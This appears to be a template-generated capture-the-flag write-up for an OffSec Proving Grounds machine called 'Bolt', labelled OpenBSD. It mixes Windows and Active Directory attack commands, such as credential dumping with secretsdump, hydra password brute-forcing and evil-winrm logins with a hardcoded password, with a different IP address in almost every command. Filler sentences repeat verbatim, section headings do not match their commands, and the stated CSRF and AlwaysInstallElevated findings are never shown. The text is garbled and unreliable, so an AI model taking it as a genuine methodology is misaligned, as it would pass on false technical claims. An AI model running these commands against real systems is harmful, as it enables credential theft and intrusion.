---
TitleSEO: "OffSec Proving Grounds — Bolt (Insane OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Bolt (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Bolt. CSRF and AlwaysInstallElevated to achieve insane compromise on OpenBSD."
Keywords: "pwntilldawn, offsec, ctf, tryhackme, reversing, windows, medium"
URL: "https://zurefx.github.io/writeups/htb-bolt-475.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-bolt-475/"
Date: "2024-03-17"
Tags: "PwnTillDawn, OffSec, CTF, TryHackMe, Reversing, Windows, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-bolt-475"
Permalink: "/writeups/htb-bolt-475.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Bolt** is rated **Insane** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.93.164.170`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.38.147.174
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.100.6.150 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.150.176 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.124.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.129.134/FUZZ
nmap -sCV -p587,27017,110 10.121.81.3 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p53,80,110 10.33.246.128 -oN scan.txt
evil-winrm -i 10.37.93.10 -u administrator -p 'P@ssw0rd!'
```

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **CSRF**.

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.23.156.103/FUZZ
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.147.247
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.153.102 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
gobuster dir -u http://10.22.135.217/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p21,110,587 10.122.49.241 -oN scan.txt
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.246.213 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.117.83.217 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `wpscan`
- `feroxbuster`
- `netcat`
- `pwncat`
- `smbexec`
- `GetUserSPNs`

### Key Takeaways

- CSRF
- AlwaysInstallElevated
